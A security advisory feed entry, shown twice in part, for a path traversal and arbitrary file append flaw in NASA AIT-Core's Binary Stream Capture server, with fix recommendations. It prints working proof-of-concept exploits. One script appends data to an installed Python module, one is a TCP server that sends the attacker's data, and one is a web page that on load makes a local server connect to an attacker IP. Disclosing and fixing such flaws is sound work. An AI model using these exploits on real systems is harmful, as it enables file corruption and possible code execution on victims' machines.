        filename = "%Y-%m-%d-%H-%M-%S-{name}.pcap"
    else:
        filename = handler["file_name_pattern"]

    log_file = handler["log_dir"]
    if "path" in handler:
        log_file = os.path.join(log_file, handler["path"], filename)
    else:
        log_file = os.path.join(log_file, filename)

    log_file = time.strftime(log_file, time.gmtime())
    log_file = log_file.format(**handler)

    return log_file
</code></pre>
<p>On POSIX systems:</p>
<ul>
<li><p>If <code>handler["path"]</code> is <strong>absolute</strong> (e.g. <code>/home/user/...</code>), <code>os.path.join(base, abs_component, ...)</code> discards the <code>base</code> component:</p>
<pre><code class="language-python">os.path.join("/configured/root", "/home/elias/ait-venv/...", "dmc.py")
# -&gt; "/home/elias/ait-venv/.../dmc.py"
</code></pre>
</li>
<li><p>If <code>handler["path"]</code> contains <code>..</code>, the result can point <strong>outside</strong> the nominal root even if <code>path</code> is relative.</p>
</li>
</ul>
<p>There is:</p>
<ul>
<li>No <code>os.path.realpath</code> canonicalization <em>after</em> join, and</li>
<li>No enforcement that the final <code>log_file</code> begins with the configured root prefix.</li>
</ul>
<p>Combined with <code>StreamCaptureManager.add_logger</code>, this means:</p>
<ul>
<li>Attacker controls both:<ul>
<li><code>handler["log_dir"]</code> (via <code>log_dir_path</code>), and</li>
<li><code>handler["path"]</code> and <code>handler["file_name_pattern"]</code>.</li>
</ul>
</li>
</ul>
<p>They can therefore direct BSC’s log output to <strong>any path that the OS permissions allow</strong>, not just under <code>root_log_directory</code>.</p>
<h3 id="24-file-opened-for-append-without-safety-checks">2.4 File opened for append without safety checks</h3>
<pre><code class="language-python"># ait/core/bsc.py

def _get_logger(self, handler):
    """Initialize a PCAP stream for logging data"""
    log_file = self._get_log_file(handler)

    if not os.path.isdir(os.path.dirname(log_file)):
        os.makedirs(os.path.dirname(log_file))

    handler["log_rot_time"] = time.gmtime()
    return pcap.open(log_file, mode="a")
</code></pre>
<p><code>pcap.open</code>:</p>
<pre><code class="language-python"># ait/core/pcap.py

def open(filename, mode="r", **options):
    ...
    mode = mode.replace("b", "") + "b"  # "a" -&gt; "ab"
    ...
    stream = PCapStream(builtins.open(filename, mode), mode)
    return stream
</code></pre>
<p>Consequences:</p>
<ul>
<li>If the target directory does not exist, <code>os.makedirs(os.path.dirname(log_file))</code> will <strong>create it</strong>, even if it is outside the intended root.</li>
<li>The file is opened in append‑binary mode (<code>"ab"</code>):<ul>
<li>The OS will create it if missing.</li>
<li>Existing content is preserved; new data is appended.</li>
</ul>
</li>
<li>There is no:<ul>
<li>realpath‑based confinement,</li>
<li>symlink protection,</li>
<li>or additional access control beyond standard filesystem permissions.</li>
</ul>
</li>
</ul>
<h3 id="25-a-part-of-the-data-written-is-attackercontrolled-network-payload">2.5 A part of the data written is attacker‑controlled network payload</h3>
<p>Captured data path:</p>
<pre><code class="language-python"># ait/core/bsc.py

def capture_packet(self):
    """Write packet data to the logger's log file."""
    data = self.socket.recv(self._buffer_size)

    for h in self.capture_handlers:
        h["reads"] += 1
        h["data_read"] += len(data)

        d = data
        if "pre_write_transforms" in h:
            for data_transform in h["pre_write_transforms"]:
                d = data_transform(d)
        h["logger"].write(d)
</code></pre>
<p><code>SocketStreamCapturer.__init__</code>:</p>
<ul>
<li><p>UDP:</p>
<pre><code class="language-python">if conn_type == "udp":
    self.socket = gevent.socket.socket(AF_INET, SOCK_DGRAM)
    self.socket.bind((address[0], address[1]))
</code></pre>
</li>
<li><p>TCP:</p>
<pre><code class="language-python">elif conn_type == "tcp":
    self.socket = gevent.socket.socket(AF_INET, SOCK_STREAM)
    self.socket.connect((address[0], address[1]))
</code></pre>
</li>
</ul>
<p>Thus:</p>
<ul>
<li>For UDP, any host that can send datagrams to the configured (IP,port) directly controls <code>data</code>.</li>
<li>For TCP, the remote server at <code>(loc, port)</code> directly controls <code>data</code>.</li>
</ul>
<p><code>PCapStream.write</code> wraps this <code>data</code> in a PCAP packet header and writes it to the file, but does not sanitize or transform the payload bytes beyond optional in‑process transforms.</p>
<hr>
<h2 id="3-recommendations">3. Recommendations</h2>
<p>The core objective is to ensure that untrusted REST input cannot steer log file paths outside a trusted directory tree.</p>
<h3 id="31-constrain-log-paths-to-a-trusted-root">3.1 Constrain log paths to a trusted root</h3>
<ul>
<li><p>In <code>StreamCaptureManager.add_logger</code> and/or <code>SocketStreamCapturer._get_log_file</code>:</p>
<ol>
<li><p>Compute a canonical root:</p>
<pre><code class="language-python">root = os.path.realpath(self._mngr_conf["root_log_directory"])
</code></pre>
</li>
<li><p>When applying <code>path</code> and <code>file_name_pattern</code>, always join relative to this root; do <strong>not</strong> accept absolute <code>path</code> from REST:</p>
<pre><code class="language-python">user_path = handler.get("path", "")
# force relative
user_path = user_path.lstrip(os.sep)
candidate = os.path.realpath(os.path.join(root, user_path, filename))
</code></pre>
</li>
<li><p>Enforce the prefix:</p>
<pre><code class="language-python">if not (candidate == root or candidate.startswith(root + os.sep)):
    raise ValueError("Invalid log path; must remain under root_log_directory")
</code></pre>
</li>
</ol>
</li>
<li><p>Reject any REST‑supplied <code>log_dir_path</code> that is absolute or attempts to escape the configured root, or disallow <code>log_dir_path</code> entirely in REST calls.</p>
</li>
</ul>
<h3 id="32-treat-rest-input-as-untrusted">3.2 Treat REST input as untrusted</h3>
<ul>
<li><p>Only allow <code>path</code> / <code>file_name_pattern</code> override from the configuration file (<code>bsc.yaml</code>), not from REST.</p>
</li>
<li><p>For REST‑created handlers, either:</p>
<ul>
<li>Use a fixed subdirectory under the configured root, or</li>
<li>Validate <code>path</code> strictly as a simple relative name with no <code>/</code> or <code>..</code>.</li>
</ul>
</li>
</ul>
<h3 id="33-note-on-tmp-usage">3.3 Note on <code>/tmp</code> usage</h3>
<ul>
<li><p>While not the root cause of this vulnerability, using a world‑writable directory such as <code>/tmp</code> as a log root in a multi‑user system is generally unsafe (standard symlink and race issues).</p>
</li>
<li><p>It is recommended to:</p>
<ul>
<li>Use a dedicated, non‑world‑writable directory for BSC logs (e.g. <code>/var/opt/ait-bsc/logs</code>).</li>
<li>Update the documentation examples to reflect this and add a warning against <code>/tmp</code> for production use.</li>
</ul>
</li>
</ul>
<h3 id="34-harden-open-calls">3.4 Harden open calls</h3>
<ul>
<li>If symlink attacks are a concern in specific deployments, consider to not follow them when writing to log files.</li>
</ul>
<h3 id="35-rest-api-exposure">3.5 REST API exposure</h3>
<ul>
<li><p>Because <code>/NAME/start</code> directly controls file paths and network connections:</p>
<ul>
<li>It should <strong>not</strong> be exposed to untrusted networks.</li>
<li>Consider adding optional HTTP authentication or limiting binding to a protected interface or Unix domain socket.</li>
</ul>
</li>
</ul>
<h2 id="4-proof-of-concept-files">4 Proof of concept files</h2>
<h3 id="41-python_pocpy">4.1 <code>python_poc.py</code></h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""
AIT-Core BSC path traversal &amp; arbitrary file append PoC (UDP, timed header).

Assumptions:
- ait-core and requests are installed.
- ait-bsc is running on 127.0.0.1:8080 with a bsc.yaml including:

    capture_manager:
      root_log_directory: /tmp
      manager_server:
        host: localhost
        port: 8080
    handlers: []

What this script does:
1) Uses the BSC REST API to create a conn_type=udp handler that:
     - binds a UDP socket on UDP_PORT, and
     - logs to TARGET_PATH, which is OUTSIDE /tmp via 'path'.
2) Waits until the current UNIX time satisfies (ts_sec &amp; 0xFF) == 0
   (low byte of ts_sec == 0) and sends a UDP PAYLOAD right then.
   On little-endian, this makes the FIRST BYTE of the PCAP packet header
   (ts_sec low byte) 0x00 with high probability.
3) Shows that TARGET_PATH (outside /tmp) exists and contains the payload.
4) DELETEs the handler so you can rerun the script without restarting ait-bsc.

Note:
- The script does NOT delete or truncate TARGET_PATH.
- If TARGET_PATH already exists, ait-bsc will append a new PCAP packet
  (header + payload) at the end of the file.
"""

import os
import socket
import time

import requests

# BSC REST API base URL
BSC_BASE_URL = "http://127.0.0.1:8080"

# UDP capture parameters
UDP_PORT = 9999
HANDLER_NAME = "traversal-udp-poc-timed"
CONN_TYPE = "udp"

# Target directory and file OUTSIDE /tmp
HOME = os.path.expanduser("~")
TARGET_DIR = "/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/"
TARGET_FILE = "dmc.py"
TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)

# Payload to be sent in the UDP datagram
PAYLOAD = b"ATTACK_PAYLOAD_UDP_TIMED_12345"


def wait_for_first_header_byte_zero():
    """
    Wait until the low byte of the current UNIX seconds is 0.

    PCapPacketHeader.pack() writes ts_sec first, and on little-endian systems
    the first byte in the file is ts_sec &amp; 0xFF. We wait for ts_sec % 256 == 0
    and for the fractional part of the second to be small.
    """
    print("[*] Waiting for ts_sec &amp; 0xFF == 0 (may take up to ~4m16s)...")
    while True:
        now = time.time()
        ts_sec = int(now)
        # Condition: low byte zero and we are in the first 200ms of this second
        if (ts_sec &amp; 0xFF) == 0 and (now - ts_sec) &lt; 0.2:
            print(f"[+] Condition met: ts_sec={ts_sec}, low byte=0x00")
            return
        time.sleep(0.01)


def create_udp_handler():
    """
    Use BSC REST API to create a UDP handler that binds on UDP_PORT and
    logs to TARGET_PATH, which is outside /tmp via the 'path' parameter.
    """
    data = {
        "loc": "",                  # bind on all interfaces
        "port": str(UDP_PORT),
        "conn_type": CONN_TYPE,
        "path": TARGET_DIR,         # ABSOLUTE path outside /tmp
        "file_name_pattern": TARGET_FILE,
    }
    url = f"{BSC_BASE_URL}/{HANDLER_NAME}/start"
    print(f"[+] Creating UDP handler via POST {url}")
    resp = requests.post(url, data=data)
    print(f"[+] Handler creation HTTP status: {resp.status_code}")
    if not (200 &lt;= resp.status_code &lt; 300):
        raise SystemExit(f"Handler creation failed: {resp.status_code} {resp.text!r}")


def send_udp_payload_timed():
    """
    Wait for the desired timestamp condition, then send the UDP payload
    to the handler's bound UDP port.
    """
    wait_for_first_header_byte_zero()
    print(f"[+] Sending timed UDP payload to 127.0.0.1:{UDP_PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(PAYLOAD, ("127.0.0.1", UDP_PORT))
    finally:
        sock.close()
    # Give ait-bsc a moment to recv and write
    time.sleep(0.5)


def stop_udp_handler():
    """
    Stop the handler so the script can be rerun without restarting ait-bsc.
    """
    url = f"{BSC_BASE_URL}/{HANDLER_NAME}/stop"
    try:
        resp = requests.delete(url, timeout=2)
        print(f"[+] DELETE {url} -&gt; HTTP {resp.status_code}")
    except Exception as e:
        print(f"[!] Failed to DELETE handler: {e!r}")


def show_result():
    """
    Display hex+ASCII view of the first bytes of TARGET_PATH.
    """
    if not os.path.exists(TARGET_PATH):
        print(f"[!] Target file does not exist: {TARGET_PATH}")
        print("    ait-bsc did not create/write the file \u2014 check config and that ait-bsc is running.")
        return

    print(f"[+] Target file was created or appended by ait-bsc: {TARGET_PATH}")
    data = open(TARGET_PATH, "rb").read()
    print(f"[+] Target file size: {len(data)} bytes")

    def chunked(seq, size):
        for i in range(0, len(seq), size):
            yield i, seq[i : i + size]

    print("[+] First bytes of file (hex + ASCII):")
    for offset, chunk in chunked(data, 16):
        hex_bytes = " ".join(f"{b:02x}" for b in chunk)
        ascii_bytes = "".join(chr(b) if 32 &lt;= b &lt; 127 else "." for b in chunk)
        print(f"{offset:08x}  {hex_bytes:&lt;47}  |{ascii_bytes}|")
        if offset &gt;= 96:
            break

    if PAYLOAD in data:
        print("[+] CONFIRMED: payload bytes are present in the file.")
    else:
        print("[!] Payload bytes not found (something went wrong).")


def main():
    print("[*] AIT-Core BSC path traversal &amp; arbitrary file append PoC (UDP, timed header)")
    print(f"[*] BSC base URL : {BSC_BASE_URL}")
    print(f"[*] UDP port     : {UDP_PORT}")
    print(f"[*] TARGET_DIR   : {TARGET_DIR}")
    print(f"[*] TARGET_FILE  : {TARGET_FILE}")
    print(f"[*] FULL PATH    : {TARGET_PATH}")
    print()

    # We deliberately do NOT create TARGET_DIR or TARGET_PATH here.
    # ait-bsc will create the directory and file when it opens the log path.
    create_udp_handler()
    send_udp_payload_timed()
    show_result()
    stop_udp_handler()

    print()
    print("[*] If you see your PAYLOAD bytes in TARGET_PATH (which is not under /tmp),")
    print("[*] then BSC has written outside its configured root_log_directory via REST 'path' using UDP.")
    print("[*] The script also timed the send so the first packet header byte (ts_sec low byte) is likely 0x00.")


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="42-attacker_tcppy">4.2 <code>attacker_tcp.py</code></h3>
<pre><code class="language-python">#!/usr/bin/env python3
import socket

HOST = "0.0.0.0"    # attacker host interface
PORT = 9001         # must match 'port' you send to ait-bsc
PAYLOAD = b"ATTACK_PAYLOAD_FROM_ATTACKER_12345\n"

def main():
    print(f"[*] Attacker TCP server listening on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(1)

        print("[*] Waiting for connection from ait-bsc...")
        bsc_sock, bsc_addr = srv.accept()
        print(f"[+] Got connection from ait-bsc at {bsc_addr}")

        with bsc_sock:
            print("[+] Sending payload to ait-bsc...")
            bsc_sock.sendall(PAYLOAD)
            print("[+] Payload sent, closing connection")

    print("[*] Done.")

if __name__ == "__main__":
    main()
</code></pre>
<h3 id="43-test1html">4.3 <code>test1.html</code></h3>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;meta charset="utf-8"&gt;
  &lt;title&gt;AIT-BSC Path Traversal PoC (Browser + TCP)&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
(function () {
  // AIT-BSC REST API on the victim
  const BSC_URL      = "http://127.0.0.1:8080";
  const HANDLER_NAME = "traversal-tcp-from-browser";

  // Attacker TCP server (remote)
  const ATTACKER_HOST = "192.168.1.184";  // change to real host/IP
  const ATTACKER_PORT = 9001;                    // must match Python server

  // Target file on the victim (outside /tmp)
  const TARGET_DIR  = "/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/";
  const TARGET_FILE = "dmc.py";

  function startHandler() {
    // Tell ait-bsc to:
    //  - connect via TCP to ATTACKER_HOST:ATTACKER_PORT
    //  - log to TARGET_DIR/TARGET_FILE (escape /tmp via 'path')
    const params = new URLSearchParams();
    params.set("loc", ATTACKER_HOST);
    params.set("port", String(ATTACKER_PORT));
    params.set("conn_type", "tcp");
    params.set("path", TARGET_DIR);
    params.set("file_name_pattern", TARGET_FILE);

    fetch(`${BSC_URL}/${HANDLER_NAME}/start`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: params.toString(),
      mode: "no-cors"  // we don't care about reading the response
    }).catch(() =&gt; {});
  }

  // On page load, just start the handler. The attacker TCP server
  // will send the payload as soon as ait-bsc connects.
  window.addEventListener("load", startHandler);
})();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NASA-AMMOS/AIT-Core/security/advisories/GHSA-p462-prxw-mjx4">https://github.com/NASA-AMMOS/AIT-Core/security/advisories/GHSA-p462-prxw-mjx4</a></li>
<li><a href="https://github.com/NASA-AMMOS/AIT-Core/releases/tag/2.6.1">https://github.com/NASA-AMMOS/AIT-Core/releases/tag/2.6.1</a></li>
<li><a href="https://github.com/NASA-AMMOS/AIT-Core/releases/tag/3.1.1">https://github.com/NASA-AMMOS/AIT-Core/releases/tag/3.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p462-prxw-mjx4">https://github.com/advisories/GHSA-p462-prxw-mjx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p462-prxw-mjx4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-05T18:11:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ait-core] NASA AMMOS Instrument Toolkit: Path traversal resulting in arbitrary file append (can be triggered over the network by unauthenticated attacker)]]></title>
        <id>https://github.com/advisories/GHSA-p462-prxw-mjx4</id>
        <link href="https://github.com/advisories/GHSA-p462-prxw-mjx4"/>
        <updated>2026-06-05T18:11:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-summary">1. Summary</h2>
<p>The Binary Stream Capture (BSC) component exposes an unauthenticated HTTP API for dynamically creating packet capture “handlers.” Because the code blindly trusts path‑related form fields, a remote client can:</p>
<ul>
<li><strong>Bypass the configured log root</strong> and direct BSC to log to <strong>arbitrary filesystem paths</strong> (path traversal / directory escape), and</li>
<li><strong>Append attacker‑controlled data</strong> to those files, using the privileges of the<code>ait-bsc</code> process.</li>
</ul>
<p>There are two ways for a remote attacker to trigger this:</p>
<ol>
<li>If the attacker has access to the network where <code>ait-bsc</code> is deployed (a reason for that could be that the ports are publicly accessible), the payloads can be directly sent to the server to trigger the arbitrary file append. This type of attack is demonstrated in <code>python_poc.py</code>.</li>
<li>Even if the attacker does not have direct access to the network because the software is running in a local network, it is possible to exploit this if a bad actor in that network opens an attacker-controlled website (which might be a website created by an attacker, or a third-party website compromised by the attacker). The browser javascript can automatically send the requests necessary to exploit this into the local network. This is even possible if the server is only accessible on <code>localhost</code>. This type of attack is demonstrated by <code>attacker_tcp.py</code> and <code>test1.html</code> (first launch the attacker TCP server, then start a webserver to host <code>test1.html</code>, for example using <code>python3 -m http.server 7000</code>,
 and open <code>test1.html</code>).</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This issue affects BSC (Binary Stream Capture) and usage of the ait-bsc server. This impacts AIT-Core versions before 3.1.1, from 2.x before 2.6.1. Users are recommended to upgrade to version 3.1.1 or 2.6.1.</p>
<h4 id="details">Details</h4>
<p>A remote attacker can use this vulnerability to append data to arbitrary files on the system (if the <code>ait-bsc</code> has privileges to write to them). It is easy to use this to corrupt data on the system (which can include the AIT-Core python code to crash the server after it is restarted and python attempts to execute the corrupted code). It should be mentioned here that there seems to be a bug in the TCP handler that results in a lot of data being written in an infinite loop after the connection has been closed, this could result in excessive disk space use. That the attacker can modify executable files like python or bash scripts means that this vulnerability could also lead to Remote Code Execution as soon as the user runs the modified code. However, depending on the system, it is not so easy to execute this attack in practice (it might not be possible), because <code>ait-bsc</code> adds a header in front of attacker-controlled data. </p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by constraining BSC ability to write paths only in the project root log directory which is configured through the bsc.yaml. Additionally, any attempts to traverse outside of the configured location are rejected.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>3.1.1</li>
<li>2.6.1</li>
</ul>
<hr>
<h2 id="2-affected-code-paths">2. Affected Code Paths</h2>
<h3 id="21-rest-entry-point-namestart">2.1 REST entry point: <code>/NAME/start</code></h3>
<p><code>StreamCaptureManagerServer</code> exposes an unauthenticated POST endpoint:</p>
<pre><code class="language-python"># ait/core/bsc.py

class StreamCaptureManagerServer(Bottle):
    def _route(self):
        self._app.route("/", method="GET", callback=self._get_logger_list)
        self._app.route("/stats", method="GET", callback=self._fetch_handler_stats)
        self._app.route(
            "/&lt;name&gt;/start", method="POST", callback=self._add_logger_by_name
        )
        self._app.route(
            "/&lt;name&gt;/stop", method="DELETE", callback=self._stop_logger_by_name
        )
        ...
</code></pre>
<p>Handler:</p>
<pre><code class="language-python">def _add_logger_by_name(self, name):
    ...
    data = dict(request.forms)
    loc = data.pop("loc", "")
    port = data.pop("port", None)
    conn_type = data.pop("conn_type", None)

    if not port or not conn_type:
        raise ValueError("Port and/or conn_type not set")

    address = [loc, int(port)]

    if "rotate_log" in data:
        data["rotate_log"] = True if data == "true" else False

    if "rotate_log_delta" in data:
        data["rotate_log_delta"] = int(data["rotate_log_delta"])

    self._logger_manager.add_logger(name, address, conn_type, **data)
</code></pre>
<p>All form fields except <code>loc</code>, <code>port</code>, <code>conn_type</code> are passed directly as <code>**data</code> into add_logger.
This includes attacker‑controlled <code>path</code>, <code>file_name_pattern</code>, and potentially <code>log_dir_path</code>.
There is no authentication on this route.</p>
<h3 id="22-manager-unvalidated-path-and-log_dir_path">2.2 Manager: unvalidated <code>path</code> and <code>log_dir_path</code></h3>
<p><code>StreamCaptureManager.add_logger</code>:</p>
<pre><code class="language-python"># ait/core/bsc.py

def add_logger(self, name, address, conn_type, log_dir_path=None, **kwargs):
    capture_handler_conf = kwargs

    if not log_dir_path:
        log_dir_path = self._mngr_conf["root_log_directory"]

    log_dir_path = os.path.normpath(os.path.expanduser(log_dir_path))

    capture_handler_conf["log_dir"] = log_dir_path
    capture_handler_conf["name"] = name
    if "rotate_log" not in capture_handler_conf:
        capture_handler_conf["rotate_log"] = True

    ...
    address_key = str(address)
    if address_key in self._stream_capturers:
        capturer = self._stream_capturers[address_key][0]
        capturer.add_handler(capture_handler_conf)
        return

    socket_logger = SocketStreamCapturer(capture_handler_conf, address, conn_type)
    greenlet = gevent.spawn(socket_logger.socket_monitor_loop)
    self._stream_capturers[address_key] = (socket_logger, greenlet)
    self._pool.add(greenlet)
</code></pre>
<p>Key points:</p>
<ul>
<li>If the REST client supplies <code>log_dir_path</code> explicitly (as a named parameter), it overrides the manager’s <code>root_log_directory</code>.</li>
<li>All other attacker‑supplied fields in <code>kwargs</code> become part of the handler configuration dict (<code>capture_handler_conf</code>), including <code>path</code> and <code>file_name_pattern</code>.</li>
<li>There is <strong>no</strong> check that <code>log_dir_path</code> or <code>path</code> are relative or confined.</li>
</ul>
<h3 id="23-path-traversal-via-_get_log_file">2.3 Path traversal via <code>_get_log_file</code></h3>
<p><code>SocketStreamCapturer._get_log_file</code> builds the actual log path:</p>
<pre><code class="language-python"># ait/core/bsc.py

def _get_log_file(self, handler):
    """Generate log file path for a given handler"""
    if "file_name_pattern" not in handler:
        filename = "%Y-%m-%d-%H-%M-%S-{name}.pcap"
    else:
        filename = handler["file_name_pattern"]

    log_file = handler["log_dir"]
    if "path" in handler:
        log_file = os.path.join(log_file, handler["path"], filename)
    else:
        log_file = os.path.join(log_file, filename)

    log_file = time.strftime(log_file, time.gmtime())
    log_file = log_file.format(**handler)

    return log_file
</code></pre>
<p>On POSIX systems:</p>
<ul>
<li><p>If <code>handler["path"]</code> is <strong>absolute</strong> (e.g. <code>/home/user/...</code>), <code>os.path.join(base, abs_component, ...)</code> discards the <code>base</code> component:</p>
<pre><code class="language-python">os.path.join("/configured/root", "/home/elias/ait-venv/...", "dmc.py")
# -&gt; "/home/elias/ait-venv/.../dmc.py"
</code></pre>
</li>
<li><p>If <code>handler["path"]</code> contains <code>..</code>, the result can point <strong>outside</strong> the nominal root even if <code>path</code> is relative.</p>
</li>
</ul>
<p>There is:</p>
<ul>
<li>No <code>os.path.realpath</code> canonicalization <em>after</em> join, and</li>
<li>No enforcement that the final <code>log_file</code> begins with the configured root prefix.</li>
</ul>
<p>Combined with <code>StreamCaptureManager.add_logger</code>, this means:</p>
<ul>
<li>Attacker controls both:<ul>
<li><code>handler["log_dir"]</code> (via <code>log_dir_path</code>), and</li>
<li><code>handler["path"]</code> and <code>handler["file_name_pattern"]</code>.</li>
</ul>
</li>
</ul>
<p>They can therefore direct BSC’s log output to <strong>any path that the OS permissions allow</strong>, not just under <code>root_log_directory</code>.</p>
<h3 id="24-file-opened-for-append-without-safety-checks">2.4 File opened for append without safety checks</h3>
<pre><code class="language-python"># ait/core/bsc.py

def _get_logger(self, handler):
    """Initialize a PCAP stream for logging data"""
    log_file = self._get_log_file(handler)

    if not os.path.isdir(os.path.dirname(log_file)):
        os.makedirs(os.path.dirname(log_file))

    handler["log_rot_time"] = time.gmtime()
    return pcap.open(log_file, mode="a")
</code></pre>
<p><code>pcap.open</code>:</p>
<pre><code class="language-python"># ait/core/pcap.py

def open(filename, mode="r", **options):
    ...
    mode = mode.replace("b", "") + "b"  # "a" -&gt; "ab"
    ...
    stream = PCapStream(builtins.open(filename, mode), mode)
    return stream
</code></pre>
<p>Consequences:</p>
<ul>
<li>If the target directory does not exist, <code>os.makedirs(os.path.dirname(log_file))</code> will <strong>create it</strong>, even if it is outside the intended root.</li>
<li>The file is opened in append‑binary mode (<code>"ab"</code>):<ul>
<li>The OS will create it if missing.</li>
<li>Existing content is preserved; new data is appended.</li>
</ul>
</li>
<li>There is no:<ul>
<li>realpath‑based confinement,</li>
<li>symlink protection,</li>
<li>or additional access control beyond standard filesystem permissions.</li>
</ul>
</li>
</ul>
<h3 id="25-a-part-of-the-data-written-is-attackercontrolled-network-payload">2.5 A part of the data written is attacker‑controlled network payload</h3>
<p>Captured data path:</p>
<pre><code class="language-python"># ait/core/bsc.py

def capture_packet(self):
    """Write packet data to the logger's log file."""
    data = self.socket.recv(self._buffer_size)

    for h in self.capture_handlers:
        h["reads"] += 1
        h["data_read"] += len(data)

        d = data
        if "pre_write_transforms" in h:
            for data_transform in h["pre_write_transforms"]:
                d = data_transform(d)
        h["logger"].write(d)
</code></pre>
<p><code>SocketStreamCapturer.__init__</code>:</p>
<ul>
<li><p>UDP:</p>
<pre><code class="language-python">if conn_type == "udp":
    self.socket = gevent.socket.socket(AF_INET, SOCK_DGRAM)
    self.socket.bind((address[0], address[1]))
</code></pre>
</li>
<li><p>TCP:</p>
<pre><code class="language-python">elif conn_type == "tcp":
    self.socket = gevent.socket.socket(AF_INET, SOCK_STREAM)
    self.socket.connect((address[0], address[1]))
</code></pre>
</li>
</ul>
<p>Thus:</p>
<ul>
<li>For UDP, any host that can send datagrams to the configured (IP,port) directly controls <code>data</code>.</li>
<li>For TCP, the remote server at <code>(loc, port)</code> directly controls <code>data</code>.</li>
</ul>
<p><code>PCapStream.write</code> wraps this <code>data</code> in a PCAP packet header and writes it to the file, but does not sanitize or transform the payload bytes beyond optional in‑process transforms.</p>
<hr>
<h2 id="3-recommendations">3. Recommendations</h2>
<p>The core objective is to ensure that untrusted REST input cannot steer log file paths outside a trusted directory tree.</p>
<h3 id="31-constrain-log-paths-to-a-trusted-root">3.1 Constrain log paths to a trusted root</h3>
<ul>
<li><p>In <code>StreamCaptureManager.add_logger</code> and/or <code>SocketStreamCapturer._get_log_file</code>:</p>
<ol>
<li><p>Compute a canonical root:</p>
<pre><code class="language-python">root = os.path.realpath(self._mngr_conf["root_log_directory"])
</code></pre>
</li>
<li><p>When applying <code>path</code> and <code>file_name_pattern</code>, always join relative to this root; do <strong>not</strong> accept absolute <code>path</code> from REST:</p>
<pre><code class="language-python">user_path = handler.get("path", "")
# force relative
user_path = user_path.lstrip(os.sep)
candidate = os.path.realpath(os.path.join(root, user_path, filename))
</code></pre>
</li>
<li><p>Enforce the prefix:</p>
<pre><code class="language-python">if not (candidate == root or candidate.startswith(root + os.sep)):
    raise ValueError("Invalid log path; must remain under root_log_directory")
</code></pre>
</li>
</ol>
</li>
<li><p>Reject any REST‑supplied <code>log_dir_path</code> that is absolute or attempts to escape the configured root, or disallow <code>log_dir_path</code> entirely in REST calls.</p>
</li>
</ul>
<h3 id="32-treat-rest-input-as-untrusted">3.2 Treat REST input as untrusted</h3>
<ul>
<li><p>Only allow <code>path</code> / <code>file_name_pattern</code> override from the configuration file (<code>bsc.yaml</code>), not from REST.</p>
</li>
<li><p>For REST‑created handlers, either:</p>
<ul>
<li>Use a fixed subdirectory under the configured root, or</li>
<li>Validate <code>path</code> strictly as a simple relative name with no <code>/</code> or <code>..</code>.</li>
</ul>
</li>
</ul>
<h3 id="33-note-on-tmp-usage">3.3 Note on <code>/tmp</code> usage</h3>
<ul>
<li><p>While not the root cause of this vulnerability, using a world‑writable directory such as <code>/tmp</code> as a log root in a multi‑user system is generally unsafe (standard symlink and race issues).</p>
</li>
<li><p>It is recommended to:</p>
<ul>
<li>Use a dedicated, non‑world‑writable directory for BSC logs (e.g. <code>/var/opt/ait-bsc/logs</code>).</li>
<li>Update the documentation examples to reflect this and add a warning against <code>/tmp</code> for production use.</li>
</ul>
</li>
</ul>
<h3 id="34-harden-open-calls">3.4 Harden open calls</h3>
<ul>
<li>If symlink attacks are a concern in specific deployments, consider to not follow them when writing to log files.</li>
</ul>
<h3 id="35-rest-api-exposure">3.5 REST API exposure</h3>
<ul>
<li><p>Because <code>/NAME/start</code> directly controls file paths and network connections:</p>
<ul>
<li>It should <strong>not</strong> be exposed to untrusted networks.</li>
<li>Consider adding optional HTTP authentication or limiting binding to a protected interface or Unix domain socket.</li>
</ul>
</li>
</ul>
<h2 id="4-proof-of-concept-files">4 Proof of concept files</h2>
<h3 id="41-python_pocpy">4.1 <code>python_poc.py</code></h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""
AIT-Core BSC path traversal &amp; arbitrary file append PoC (UDP, timed header).

Assumptions:
- ait-core and requests are installed.
- ait-bsc is running on 127.0.0.1:8080 with a bsc.yaml including:

    capture_manager:
      root_log_directory: /tmp
      manager_server:
        host: localhost
        port: 8080
    handlers: []

What this script does:
1) Uses the BSC REST API to create a conn_type=udp handler that:
     - binds a UDP socket on UDP_PORT, and
     - logs to TARGET_PATH, which is OUTSIDE /tmp via 'path'.
2) Waits until the current UNIX time satisfies (ts_sec &amp; 0xFF) == 0
   (low byte of ts_sec == 0) and sends a UDP PAYLOAD right then.
   On little-endian, this makes the FIRST BYTE of the PCAP packet header
   (ts_sec low byte) 0x00 with high probability.
3) Shows that TARGET_PATH (outside /tmp) exists and contains the payload.
4) DELETEs the handler so you can rerun the script without restarting ait-bsc.

Note:
- The script does NOT delete or truncate TARGET_PATH.
- If TARGET_PATH already exists, ait-bsc will append a new PCAP packet
  (header + payload) at the end of the file.
"""

import os
import socket
import time

import requests

# BSC REST API base URL
BSC_BASE_URL = "http://127.0.0.1:8080"

# UDP capture parameters
UDP_PORT = 9999
HANDLER_NAME = "traversal-udp-poc-timed"
CONN_TYPE = "udp"

# Target directory and file OUTSIDE /tmp
